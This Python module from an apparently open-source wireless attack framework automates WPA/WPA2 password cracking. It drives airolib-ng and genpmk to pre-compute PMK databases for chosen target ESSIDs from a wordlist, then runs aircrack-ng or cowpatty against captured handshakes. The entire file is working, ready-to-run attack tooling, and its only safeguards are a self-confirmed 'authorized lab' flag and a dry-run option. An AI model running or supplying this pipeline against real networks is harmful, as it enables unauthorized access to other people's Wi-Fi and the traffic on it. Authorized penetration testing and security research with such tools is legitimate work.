#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""PMK Pre-computation Pipeline - airolib-ng + cowpatty rainbow table generation.

Builds a pre-computed PMK (Pairwise Master Key) database for specific ESSIDs,
enabling near-instant WPA/WPA2 cracking when a handshake is captured later.
Supports both airolib-ng (aircrack-ng suite) and genpmk/cowpatty workflows.

Requires: airolib-ng, aircrack-ng (for crack), optionally cowpatty + genpmk.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
from typing import List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


def _which(binary: str) -> Optional[str]:
    return shutil.which(binary)


class Exploit(Exploit):
    """Pre-compute PMK databases for instant WPA/WPA2 cracking."""

    __info__ = {
        "name": "PMK Pre-computation Pipeline",
        "description": (
            "Build airolib-ng PMK databases or cowpatty rainbow tables for target "
            "ESSIDs. Pre-computing PMKs (PBKDF2-SHA1, 4096 iterations) converts "
            "the expensive hash step into a one-time cost, making subsequent cracks "
            "against those ESSIDs near-instant."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            "aircrack-ng team (GPL-2.0), cowpatty (GPL, invoked as subprocess)",
        ),
        "references": (
            "https://www.aircrack-ng.org/doku.php?id=airolib-ng",
            "https://www.willhackforsushi.com/?page_id=50",
        ),
        "devices": ("wifi", "802.11 WPA/WPA2"),
    }

    mode = OptString(
        "airolib_build",
        "Mode: airolib_build (import+batch), airolib_crack, cowpatty_gen, "
        "cowpatty_crack, info",
    )
    essid = OptString("", "Target ESSID (required for PMK computation)")
    essid_file = OptString("", "File with multiple ESSIDs (one per line)")
    wordlist = OptString("", "Wordlist/password file path")
    db_path = OptString("", "airolib-ng database path (SQLite); auto-created if missing")
    capture_file = OptString("", "Capture file (.cap) for cracking step")
    bssid = OptString("", "Target BSSID for cracking (optional filter)")
    cowpatty_table = OptString("", "cowpatty rainbow table path (.cow)")
    output_dir = OptString(".tmp", "Output directory")
    dry_run = OptBool(False, "Print commands without executing")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def _require(self, name: str) -> Optional[str]:
        path = _which(name)
        if not path:
            print_error(f"{name} not found. Install the required package.")
        return path

    def _run(self, cmd: List[str], *, label: str = "",
             timeout: int = 0) -> Optional[str]:
        cmd_str = " ".join(cmd)
        if bool(self.dry_run):
            print_info(f"[dry-run] {label}: {cmd_str}")
            return None
        print_status(f"{label}: {cmd_str}")
        try:
            kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.STDOUT}
            if timeout > 0:
                kwargs["timeout"] = timeout
            result = subprocess.run(cmd, **kwargs)
            output = result.stdout.decode("utf-8", errors="replace")
            for line in output.strip().splitlines():
                print_info(line)
            return output
        except subprocess.TimeoutExpired:
            print_status(f"Timeout reached for {label}")
            return ""
        except FileNotFoundError:
            print_error(f"Binary not found: {cmd[0]}")
            return None

    def _outdir(self) -> str:
        d = str(self.output_dir).strip() or ".tmp"
        os.makedirs(d, exist_ok=True)
        return d

    def _airolib_build(self) -> None:
        """Import ESSIDs + passwords into airolib-ng DB and batch-compute PMKs."""
        airolib = self._require("airolib-ng")
        if not airolib:
            return

        db = str(self.db_path).strip()
        if not db:
            outdir = self._outdir()
            db = os.path.join(outdir, "pmk_precompute.db")
            print_info(f"Using default DB: {db}")

        essid = str(self.essid).strip()
        essid_file = str(self.essid_file).strip()
        wl = str(self.wordlist).strip()

        if not essid and not essid_file:
            print_error("Set essid or essid_file.")
            return
        if not wl:
            print_error("Set wordlist.")
            return

        if essid_file and os.path.isfile(essid_file):
            self._run([airolib, db, "--import", "essid", essid_file],
                      label="Import ESSIDs from file")
        elif essid:
            import_file = os.path.join(self._outdir(), "_essid_tmp.txt")
            with open(import_file, "w") as f:
                f.write(essid + "\n")
            self._run([airolib, db, "--import", "essid", import_file],
                      label=f"Import ESSID: {essid}")

        self._run([airolib, db, "--import", "passwd", wl],
                  label="Import passwords")

        self._run([airolib, db, "--stats"], label="DB stats before batch")

        print_status("Starting PMK batch computation (this may take a long time)...")
        self._run([airolib, db, "--batch"], label="PMK batch compute")

        self._run([airolib, db, "--stats"], label="DB stats after batch")
        print_success(f"PMK database ready: {db}")

    def _airolib_crack(self) -> None:
        """Crack WPA using pre-computed PMK database."""
        aircrack = self._require("aircrack-ng")
        if not aircrack:
            return

        db = str(self.db_path).strip()
        cap = str(self.capture_file).strip()
        if not db or not cap:
            print_error("Set db_path and capture_file.")
            return

        cmd = [aircrack, "-r", db]
        bssid = str(self.bssid).strip()
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(cap)

        self._run(cmd, label="aircrack-ng PMK DB crack")

    def _cowpatty_gen(self) -> None:
        """Generate cowpatty rainbow table using genpmk."""
        genpmk = self._require("genpmk")
        if not genpmk:
            return

        essid = str(self.essid).strip()
        wl = str(self.wordlist).strip()
        if not essid or not wl:
            print_error("Set essid and wordlist for genpmk.")
            return

        outdir = self._outdir()
        table_path = str(self.cowpatty_table).strip()
        if not table_path:
            table_path = os.path.join(outdir, f"{essid}_pmk.cow")

        cmd = [genpmk, "-f", wl, "-d", table_path, "-s", essid]
        self._run(cmd, label="genpmk rainbow generation")
        if os.path.isfile(table_path):
            print_success(f"Rainbow table: {table_path}")

    def _cowpatty_crack(self) -> None:
        """Crack WPA with cowpatty using pre-computed rainbow table."""
        cowpatty = self._require("cowpatty")
        if not cowpatty:
            return

        table = str(self.cowpatty_table).strip()
        cap = str(self.capture_file).strip()
        essid = str(self.essid).strip()
        if not table or not cap or not essid:
            print_error("Set cowpatty_table, capture_file, and essid.")
            return

        cmd = [cowpatty, "-d", table, "-r", cap, "-s", essid]
        self._run(cmd, label="cowpatty rainbow crack")

    def _info(self) -> None:
        """Show information about PMK pre-computation."""
        print_info("PMK Pre-computation Pipeline")
        print_info("============================")
        print_info("WPA/WPA2 PSK uses PBKDF2-SHA1 (4096 iterations) to derive PMK from")
        print_info("password + ESSID. Pre-computing PMKs for target ESSIDs converts this")
        print_info("expensive step into a one-time cost.")
        print_info("")
        print_info("Workflow A (airolib-ng):")
        print_info("  1. set mode airolib_build; set essid <TARGET>; set wordlist <PATH>")
        print_info("  2. (capture handshake)")
        print_info("  3. set mode airolib_crack; set capture_file <CAP>")
        print_info("")
        print_info("Workflow B (cowpatty/genpmk):")
        print_info("  1. set mode cowpatty_gen; set essid <TARGET>; set wordlist <PATH>")
        print_info("  2. (capture handshake)")
        print_info("  3. set mode cowpatty_crack; set capture_file <CAP>; set essid <TARGET>")
        print_info("")

        for tool in ("airolib-ng", "aircrack-ng", "genpmk", "cowpatty"):
            path = _which(tool)
            if path:
                print_success(f"  [+] {tool}: {path}")
            else:
                print_error(f"  [-] {tool}: not found")


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        op = str(self.mode).strip().lower()
        dispatch = {
            "airolib_build": self._airolib_build,
            "airolib_crack": self._airolib_crack,
            "cowpatty_gen": self._cowpatty_gen,
            "cowpatty_crack": self._cowpatty_crack,
            "info": self._info,
        }
        handler = dispatch.get(op)
        if not handler:
            print_error(f"Unknown mode: {op}. Valid: {', '.join(dispatch.keys())}")
            return

        if op != "info" and not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return

        handler()
